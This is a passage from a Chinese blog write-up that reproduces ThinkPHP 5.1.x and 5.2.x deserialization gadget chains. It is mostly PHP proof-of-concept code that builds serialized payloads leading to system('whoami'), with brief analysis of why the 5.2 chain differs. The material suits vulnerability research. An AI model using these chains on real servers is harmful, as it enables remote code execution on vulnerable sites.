class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$data</span>, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="string">&#x27;7.1.0&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">                        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">arrayReset</span>(<span class="variable">$data</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span>, <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>) <span class="keyword">as</span> <span class="variable">$val</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$val</span>])) &#123;</span><br><span class="line">                        <span class="variable">$data</span> = <span class="variable">$data</span>[<span class="variable">$val</span>];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$filter</span>, <span class="variable">$default</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">                    <span class="variable">$filter</span> = [];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$filter</span> = <span class="variable">$filter</span> ?: <span class="variable language_">$this</span>-&gt;filter;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$filter</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$filter</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                        <span class="variable">$filter</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$filter</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$filter</span> = (<span class="keyword">array</span>) <span class="variable">$filter</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="variable">$filter</span>[] = <span class="variable">$default</span>;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$filter</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="comment">#($filters, $value);</span></span><br><span class="line">                <span class="variable">$default</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$filters</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">is_callable</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">                        <span class="variable">$value</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">                    <span class="variable">$method</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">method</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                            <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="literal">false</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                            <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(<span class="literal">false</span>);</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span>:</span><br><span class="line">                            <span class="variable">$vars</span> = [];</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;param = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">                    <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">                    <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file</span>();</span><br><span class="line">                    <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="variable language_">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span>(<span class="params"><span class="variable">$ajax</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="variable">$value</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);</span><br><span class="line">                <span class="variable">$result</span> = <span class="string">&#x27;xmlhttprequest&#x27;</span> == <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$ajax</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$result</span>           = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">param</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;var_ajax&#x27;</span>]) ? <span class="literal">true</span> : <span class="variable">$result</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">server</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;server;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$name</span> = <span class="title function_ invoke__">strtoupper</span>(<span class="variable">$name</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;server[<span class="variable">$name</span>]) ? <span class="variable language_">$this</span>-&gt;server[<span class="variable">$name</span>] : <span class="variable">$default</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setHook</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;hook[<span class="string">&#x27;visible&#x27;</span>] = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">        </span>&#123;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">            <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line">        <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> &#123;</span><br><span class="line">        $<span class="title class_">request</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">Request</span>;</span><br><span class="line">        <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">setHook</span>(<span class="keyword">array</span>(<span class="variable">$request</span>, <span class="string">&#x27;isAjax&#x27;</span>));</span><br><span class="line">        <span class="variable">$conversion</span> = <span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>();</span><br><span class="line">        <span class="variable">$conversion</span>-&gt;<span class="title function_ invoke__">setData</span>(<span class="string">&#x27;key&#x27;</span>, <span class="variable">$request</span>);</span><br><span class="line">        <span class="variable">$windows</span> = <span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>();</span><br><span class="line">        <span class="variable">$windows</span>-&gt;<span class="title function_ invoke__">setFile</span>(<span class="variable">$conversion</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$windows</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="ThinkPHP5-2-X">ThinkPHP5.2.X</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer create-project topthink/think=5.2.x-dev tp52x</span><br><span class="line">cd tp52x</span><br><span class="line">./think run</span><br></pre></td></tr></table></figure>
<p><img src="./1571192945070.png" alt="Alt text"></p>
<p><img src="./1571192967882.png" alt="Alt text"></p>
<p><img src="./1571193283633.png" alt="Alt text"></p>
<p>在复现在时候看到文章分析说tp5.2.x里面的<code>$relation-&gt;visible($name);</code>被删除掉了，所以没法用tp5.1.x的链。个人感觉其实说的不对，如下图所示，它还在只是被封装到了另外一个函数里面，变量依然可控，<strong>真正的原因应该是 Request 类的 __call 方法被被移除了</strong>。<br>
<img src="./1571204818047.png" alt="Alt text"></p>
<p>至此，tp5.1和tp5.2从这里开始分叉，tp5.2.x就下来用的gadget是toArray中的getAttr<br>
<img src="./1571205423110.png" alt="Alt text"></p>
<p><img src="./1571205777062.png" alt="Alt text"></p>
<p><img src="./1571205916533.png" alt="Alt text"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span> &#123;</span><br><span class="line">        <span class="title class_">class</span> <span class="title class_">Windows</span> &#123;</span><br><span class="line">            <span class="title class_">private</span> $<span class="title class_">files</span> = [];</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$fileHandles</span> = [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">removeFiles</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;fileHandles <span class="keyword">as</span> <span class="variable">$handle</span>) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">fclose</span>(<span class="variable">$handle</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;fileHandles = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">                        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;files = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setFile</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;files[] = <span class="variable">$value</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span> &#123;</span><br><span class="line">        <span class="title class_">trait</span> <span class="title class_">Conversion</span>&#123;</span><br><span class="line">            <span class="title class_">protected</span> $<span class="title class_">visable</span> = [&#x27;<span class="title class_">key</span>&#x27; =&gt; &#x27;<span class="title class_">value</span>&#x27;];</span><br><span class="line">                  </span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="variable">$item</span>       = [];</span><br><span class="line">                <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)      = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                            <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                            <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;hidden <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)     = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                            <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 合并关联数据</span></span><br><span class="line">                <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                        <span class="comment">// 关联模型对象</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                            <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">                        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                            <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">hidden</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 关联模型对象</span></span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">toArray</span>(), <span class="variable">$options</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span>&#123;</span><br><span class="line">            <span class="keyword">protected</span> <span class="variable">$strict</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&#x27;key&#x27;</span> =&gt; <span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line">            <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&#x27;key&#x27;</span> =&gt; <span class="string">&#x27;system&#x27;</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="variable">$value</span>, <span class="keyword">bool</span> <span class="variable">$relation</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="comment">// 检测属性获取器</span></span><br><span class="line">                <span class="variable">$fieldName</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRealFieldName</span>(<span class="variable">$name</span>);</span><br><span class="line">                <span class="comment">//$method    = &#x27;get&#x27; . App::parseName($name, 1) . &#x27;Attr&#x27;;</span></span><br><span class="line">        </span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationValue</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="variable">$closure</span> = <span class="variable language_">$this</span>-&gt;withAttr[<span class="variable">$fieldName</span>];</span><br><span class="line">                    <span class="variable">$value</span>   = <span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$method</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationValue</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$method</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;type[<span class="variable">$fieldName</span>])) &#123;</span><br><span class="line">                    <span class="comment">// 类型转换</span></span><br><span class="line">                    <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readTransform</span>(<span class="variable">$value</span>, <span class="variable">$this</span>-&gt;type[<span class="variable">$fieldName</span>]);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="variable language_">$this</span>-&gt;autoWriteTimestamp &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$fieldName</span>, [<span class="variable">$this</span>-&gt;createTime, <span class="variable">$this</span>-&gt;updateTime])) &#123;</span><br><span class="line">                    <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getTimestampValue</span>(<span class="variable">$value</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                    <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationAttribute</span>(<span class="variable">$name</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">            </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="literal">false</span>;</span><br><span class="line">                    <span class="variable">$value</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$name</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (<span class="built_in">InvalidArgumentException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable">$value</span>    = <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getValue</span>(<span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$relation</span>);</span><br><span class="line">            &#125;</span><br><span 